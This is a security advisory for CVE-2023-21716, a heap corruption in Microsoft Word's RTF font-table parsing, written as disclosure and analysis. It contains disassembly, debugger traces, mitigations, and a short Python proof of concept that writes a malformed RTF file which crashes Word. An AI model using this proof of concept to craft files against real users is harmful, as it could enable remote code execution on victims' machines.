# CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption

A vulnerability within Microsoft Office's wwlib allows attackers to achieve
remote code execution with the privileges of the victim that opens a malicious
RTF document. The attacker could deliver this file as an email attachment (or
other means).

## Background

Microsoft Word is the word processing application included with Microsoft
Office. Per a default installation, Microsoft Word handles Rich-Text Format
(RTF) documents. Such documents are comprised of primarily 7-bit ASCII based
keywords that together can encapsulate a wide variety of rich content.


## Vulnerability Details

The RTF parser in Microsoft Word contains a heap corruption vulnerability when
dealing with a font table (*\fonttbl*) containing an excessive number of fonts
(*\f###*). When processing fonts, the font id value (the numbers after a *\f*)
are handled by the following code:

{% highlight asm %}
0d6cf0b6 0fbf0e          movsx   ecx,word ptr [esi]         ; load base idx
0d6cf0b9 0fbf5602        movsx   edx,word ptr [esi+2]       ; load font idx
0d6cf0bd 8d1451          lea     edx,[ecx+edx*2]            ; multiply by ~3
0d6cf0c0 668b08          mov     cx,word ptr [eax]          ; load the codepage value
0d6cf0c3 66894c5604      mov     word ptr [esi+edx*2+4],cx  ; write the code page
{% endhighlight %}

As shown, the font ID value is loaded by the "movsx" instruction at 0xd6cf0c3.
This instruction sign extends the value loaded, thus filling the upper bits of
*edx* with **ffff**. The following debugger excerpt illustrates the runtime
behavior:

<pre>
*** edx will become: 0x17fc8 (from 0x7fec+0x7fee*2)
*** edx will become: 0x17fc9 (from 0x7fed+0x7fee*2)
*** edx will become: 0x17fde (from 0x7fee+0x7ff8*2)
*** edx will become: 0x17fdf (from 0x7fef+0x7ff8*2)
*** edx will become: 0x17fe0 (from 0x7ff0+0x7ff8*2)
*** edx will become: 0x17fe1 (from 0x7ff1+0x7ff8*2)
*** edx will become: 0x17fe2 (from 0x7ff2+0x7ff8*2)
*** edx will become: 0x17fe3 (from 0x7ff3+0x7ff8*2)
*** edx will become: 0x17fe4 (from 0x7ff4+0x7ff8*2)
*** edx will become: 0x17fe5 (from 0x7ff5+0x7ff8*2)
*** edx will become: 0x17fe6 (from 0x7ff6+0x7ff8*2)
*** edx will become: 0x17fe7 (from 0x7ff7+0x7ff8*2)
*** edx will become: 0xffff7ffc (from 0x7ff8+0xffff8002*2)
</pre>

When this occurs, the memory write instruction at 0xd6cf0c3 corrupts the heap
by writing the font code page to a negative offset of the memory held in *esi*.
The following debugger excerpt shows the out-of-bounds memory write.

<pre>
*** writing 0x4e4 to 0xd35ddb4 [0xd32de20+0x17fc8*2+4]
*** writing 0x4e4 to 0xd35ddb6 [0xd32de20+0x17fc9*2+4]
*** writing 0x4e4 to 0xd35dde0 [0xd32de20+0x17fde*2+4]
*** writing 0x4e4 to 0xd35dde2 [0xd32de20+0x17fdf*2+4]
*** writing 0x4e4 to 0xd35dde4 [0xd32de20+0x17fe0*2+4]
*** writing 0x4e4 to 0xd35dde6 [0xd32de20+0x17fe1*2+4]
*** writing 0x4e4 to 0xd35dde8 [0xd32de20+0x17fe2*2+4]
*** writing 0x4e4 to 0xd35ddea [0xd32de20+0x17fe3*2+4]
*** writing 0x4e4 to 0xd35ddec [0xd32de20+0x17fe4*2+4]
*** writing 0x4e4 to 0xd35ddee [0xd32de20+0x17fe5*2+4]
*** writing 0x4e4 to 0xd35ddf0 [0xd32de20+0x17fe6*2+4]
*** writing 0x4e4 to 0xd35ddf2 [0xd32de20+0x17fe7*2+4]
*** writing 0x4e4 to 0xd31de1c [0xd32de20+0xffff7ffc*2+4]
</pre>

Following this memory corruption, additional processing takes place. With a
properly crafted heap layout, an attacker cause the heap corruption to yield
arbitrary code execution.

Using the proof-of-concept code supplied below, processing eventually reaches
the post-processing clean up code. As expected, *RtlFreeHeap* is called and
detects heap corruption as shown below.

<pre>
Critical error detected c0000374
(3ba8.21f4): WOW64 breakpoint - code 4000001f (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
ntdll_77a40000!RtlReportCriticalFailure+0x4b:
77b27012 cc              int     3
0:000:x86> kv
 # ChildEBP RetAddr  Args to Child              
00 008f3834 77b30114 00000001 77b63990 77b2e009 ntdll_77a40000!RtlReportCriticalFailure+0x4b (FPO: [Non-Fpo])
01 008f3840 77b2e009 70dcf286 00000000 1ff78c20 ntdll_77a40000!RtlpReportHeapFailure+0x2f (FPO: [0,0,4])
02 008f3870 77b36480 00000003 00a50000 1ff78c20 ntdll_77a40000!RtlpHpHeapHandleError+0x89 (FPO: [Non-Fpo])
03 008f3888 77b2dd17 1ff78c20 0000000a 00000000 ntdll_77a40000!RtlpLogHeapFailure+0x43 (FPO: [Non-Fpo])
04 008f38ec 77a83f8d 00a50258 70dcf0be 1ff78c20 ntdll_77a40000!RtlpAnalyzeHeapFailure+0x281 (FPO: [Non-Fpo])
05 008f3a48 77ac7b9d 1ff78c20 1ff78c28 1ff78c28 ntdll_77a40000!RtlpFreeHeap+0x24d (FPO: [Non-Fpo])
06 008f3aa4 77a83ce6 00000000 00000000 00000000 ntdll_77a40000!RtlpFreeHeapInternal+0x783 (FPO: [Non-Fpo])
07 008f3ac4 05343c06 00a50000 00000000 1ff78c28 ntdll_77a40000!RtlFreeHeap+0x46 (FPO: [Non-Fpo])
08 008f3adc 06e6e330 1ff78c28 06c8dc6d 08a11040 mso20win32client!Mso::Memory::Free+0x47 (FPO: [Non-Fpo])
09 008f3b0c 0430b5af 08a1104c 08a11040 08a11044 mso!MsoFreePpv+0x84 (FPO: [Non-Fpo])
0a 008f3b28 0430bed0 008f9f0c 008f586c ffffffff wwlib!FreeHribl+0x8c (FPO: [Non-Fpo])
0b 008f3b70 033be323 40280000 00200002 1a772b98 wwlib!PdodCreateRtf+0x243 (FPO: [6,13,4])
0c 008f52bc 02e465db 04012000 20280000 00200002 wwlib!``Osf::SimpleFlight::Details::SetupFlight_String'::`3'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'scopes''+0x1e0966
0d 008f5600 03031155 00000000 ffffffff 00000000 wwlib!PdodCreatePfnCore+0x321 (FPO: [Non-Fpo])
0e 008f5680 0301583a 00000000 ffffffff 00000000 wwlib!PdodCreatePfnBPPaapWithEdpi+0x75 (FPO: [18,3,4])
0f 008f8c4c 030175d4 04012000 00000000 00000002 wwlib!PdodOpenFnmCore2+0xf3b (FPO: [Non-Fpo])
10 008f8d14 03c43d9b 04012000 00000000 00000002 wwlib!PdodOpenFnmCore+0xb9 (FPO: [15,30,0])
11 008f9e40 03c43a92 00000000 00000000 00000002 wwlib!FFileOpenXszCore+0x2f6 (FPO: [Non-Fpo])
12 008f9e7c 0343bd43 00000000 00000000 00000002 wwlib!FFileOpenXstzCore+0x3d (FPO: [6,4,0])
13 008fb31c 02d17666 00000001 00000000 02d17609 wwlib!``Osf::SimpleFlight::Details::SetupFlight_String'::`3'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'scopes''+0x271a8e
14 008fb554 02c594f5 71fc93df 7625f550 0000000a wwlib!Boot::IfrParseCommandLine2+0x5d (FPO: [Non-Fpo])
15 008fb5c8 02c59317 008fb5f8 02c50000 02c58ff4 wwlib!Boot::FRun+0xb4 (FPO: [Non-Fpo])
16 008ff684 02c59058 96c6d88c 000800e4 71fcd0a7 wwlib!FWordBoot+0x5a (FPO: [Non-Fpo])
17 008ff6b8 00dd1917 00dd0000 00000000 0000000a wwlib!FMain+0x64 (FPO: [Non-Fpo])
18 008ff908 00dd114a 00dd0000 00000000 00a54944 winword!WinMain+0x146 (FPO: [Non-Fpo])
19 008ff954 7625fa29 0069a000 7625fa10 008ff9c0 winword!std::_Deallocate<8,0>+0x1e3 (FPO: [Non-Fpo])
1a 008ff964 77aa7bbe 0069a000 70dc3336 00000000 KERNEL32!BaseThreadInitThunk+0x19 (FPO: [Non-Fpo])
1b 008ff9c0 77aa7b8e ffffffff 77ac8d0f 00000000 ntdll_77a40000!__RtlUserThreadStart+0x2f (FPO: [SEH])
1c 008ff9d0 00000000 00dd1000 0069a000 00000000 ntdll_77a40000!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])
</pre>

Analysts can also use Page Heap to verify that the code attempts to write out
of bounds. Doing so results in the following:

<pre>
(afe8.9a5c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
wwlib!FSearchFtcmap+0x150:
0dc1f0c3 66894c5604      mov     word ptr [esi+edx*2+4],cx ds:002b:1ebf2fec=????
0:000:x86> kv
 # ChildEBP RetAddr  Args to Child              
00 0135135c 0dc0fa17 013513ec 00000001 013513d8 wwlib!FSearchFtcmap+0x150 (FPO: [Non-Fpo])
01 01353828 0dc0ddb5 ddc5a2cb 0b3d3028 000ad400 wwlib!RtfInRare+0x1845 (FPO: [Non-Fpo])
02 01353c5c 0ef5c473 00000200 0b3d3028 66565a58 wwlib!CchRtfInCore+0x28df (FPO: [Non-Fpo])
03 01353eac 0ef5be04 0b3d302c 0135a294 01355bf4 wwlib!RtfGetChars+0x183 (FPO: [Non-Fpo])
04 01353ef8 0e00e323 40280000 00200002 45646f10 wwlib!PdodCreateRtf+0x177 (FPO: [6,13,4])
05 01355644 0da965db 04012000 20280000 00200002 wwlib!``Osf::SimpleFlight::Details::SetupFlight_String'::`3'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'scopes''+0x1e0966
06 01355988 0dc81155 00000000 ffffffff 00000000 wwlib!PdodCreatePfnCore+0x321 (FPO: [Non-Fpo])
07 01355a08 0dc6583a 00000000 ffffffff 00000000 wwlib!PdodCreatePfnBPPaapWithEdpi+0x75 (FPO: [18,3,4])
08 01358fd4 0dc675d4 04012000 00000000 00000002 wwlib!PdodOpenFnmCore2+0xf3b (FPO: [Non-Fpo])
09 0135909c 0e893d9b 04012000 00000000 00000002 wwlib!PdodOpenFnmCore+0xb9 (FPO: [15,30,0])
0a 0135a1c8 0e893a92 00000000 00000000 00000002 wwlib!FFileOpenXszCore+0x2f6 (FPO: [Non-Fpo])
0b 0135a204 0e08bd43 00000000 00000000 00000002 wwlib!FFileOpenXstzCore+0x3d (FPO: [6,4,0])
0c 0135b6a4 0d967666 00000001 00000000 0d967609 wwlib!``Osf::SimpleFlight::Details::SetupFlight_String'::`3'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'scopes''+0x271a8e
0d 0135b8dc 0d8a94f5 ddc527df 7625f550 0000000a wwlib!Boot::IfrParseCommandLine2+0x5d (FPO: [Non-Fpo])
0e 0135b954 0d8a9317 0135b984 0d8a0000 0d8a8ff4 wwlib!Boot::FRun+0xb4 (FPO: [Non-Fpo])
0f 0135fa10 0d8a9058 cbd5c9e4 00080138 ddc564d3 wwlib!FWordBoot+0x5a (FPO: [Non-Fpo])
10 0135fa44 00dd1917 00dd0000 00000000 0000000a wwlib!FMain+0x64 (FPO: [Non-Fpo])
11 0135fc94 00dd114a 00dd0000 00000000 05e18ff4 winword!WinMain+0x146 (FPO: [Non-Fpo])
12 0135fce0 7625fa29 011cf000 7625fa10 0135fd4c winword!std::_Deallocate<8,0>+0x1e3 (FPO: [Non-Fpo])
13 0135fcf0 77aa7bbe 011cf000 96082e8a 00000000 KERNEL32!BaseThreadInitThunk+0x19 (FPO: [Non-Fpo])
14 0135fd4c 77aa7b8e ffffffff 77ac8d34 00000000 ntdll_77a40000!__RtlUserThreadStart+0x2f (FPO: [SEH])
15 0135fd5c 00000000 00dd1000 011cf000 00000000 ntdll_77a40000!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])
</pre>


## Affected Versions

This vulnerability affects at least the following versions of Microsoft Office:

* Microsoft Office 365 (Insider Preview - 2211 Build 15831.20122 CTR)
* Microsoft Office 2016 (Including Insider Slow - 1704 Build 8067.2032 CTR)
* Microsoft Office 2013
* Microsoft Office 2010
* Microsoft Office 2007

Older versions may also be affected but were not tested. Furthermore, the
technical details of this vulnerability have evolved over the years.


## Mitigations

Microsoft Office 2010 and later use Protected View to limit damage caused by
malicious documents procured from untrusted sources. Protected View is
in effect when this vulnerability manifests and thus an additional sandbox
escape vulnerability would be required to gain full privileges.

Removing the file association for the RTF extension is ineffective because
using a DOC extension will still reach the vulnerable code.


## Acknowledgement

This issue was discovered, analyzed, and reported by Joshua J. Drake (@jduck).


## Proof-of-Concept

The following Python script will generate a file that will trigger this issue:

{% highlight Python %}
#!/usr/bin/python
#
# PoC for:
# Microsoft Word RTF Font Table Heap Corruption Vulnerability
#
# by Joshua J. Drake (@jduck)
#

import sys

# allow overriding the number of fonts
num = 32761
if len(sys.argv) > 1:
  num = int(sys.argv[1])

f = open("tezt.rtf", "wb")
f.write("{\\rtf1{\n{\\fonttbl")
for i in range(num):
  f.write("{\\f%dA;}\n" % i)
f.write("}\n")
f.write("{\\rtlch it didn't crash?? no calc?! BOO!!!}\n")
f.write("}}\n")
f.close()
{% endhighlight %}


## Testing Notes

Running Microsoft Word repeatedly with this malformed input will trigger "Safe
Mode" as well as a file-specific block list. To observe the behavior that a
victim user would see, the tester should flush the "Safe Mode" flag and
file-specific block list before re-testing. Otherwise, simply declining "Safe
Mode" and clicking "Open Anyway" is sufficient for re-tests.

Using heavy breakpoints (such as those supplied below) in WinDbg and enabling
Page Heap can slow the startup process significantly. The researcher observed
situations during testing where the vulnerable code was not reached. Minimal
effort was invested to determine the cause, but it appears to be related to a
combination of Page Heap, heavy breakpoints, and a "What's new" dialog popup.

## Appendix

The following script was used within WinDbg to generate the above output. All
excerpts were obtained using Office 365 Insider Preview 2211 Build 15831.20122
CTR.

<pre>
* clear all breakpoints
bc *
* hide the debugger
e ebx+2 00
* run until wwlib is loaded
xe ld:wwlib
g; wait
* make the breakpoints
* watch index calculations
bp wwlib+0x37f0bd ".printf \"*** edx will become: 0x%x (from 0x%x+0x%x*2)\\n\", (ecx+edx*2), ecx, edx;gc"
* watch the writes
bp wwlib+0x37f0c3 ".printf \"*** writing 0x%x to 0x%x [0x%x+0x%x*2+4] (div 3: 0x%x)\\n\", ecx & 0xffff, (esi+(edx*2)+4), esi, edx, edx/3;gc"
g
</pre>

## EOF
